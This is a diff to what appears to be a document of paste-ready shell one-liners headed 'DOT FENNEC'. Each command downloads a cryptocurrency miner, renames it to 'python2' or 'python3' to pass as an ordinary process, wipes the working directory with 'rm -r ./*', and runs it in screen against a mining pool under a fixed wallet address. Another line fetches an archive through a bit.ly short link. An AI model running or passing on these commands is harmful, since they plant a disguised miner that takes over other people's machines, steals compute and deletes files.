@@ -13,4 +13,6 @@ apt install screen -y && wget bit.ly/dotgpulol && tar -xf dotgpulol && rm dotgpu
 ===========================================================================
 # DOT FENNEC
 ```
-apt install screen -y && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python3 && mv python3* ~/ && rm -r ./* && cd ~/ && screen ./python3 -a cpupower -o cpupower.sea.mine.zpool.ca:6240 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,zap=CPU
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python2 && mv python2* ~/ && rm -r ./* && cd ~/ && screen ./python2 -a cpupower -o cpupower.asia.mine.zergpool.com:4250 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,zap=CPU
+```
+===========================================================================
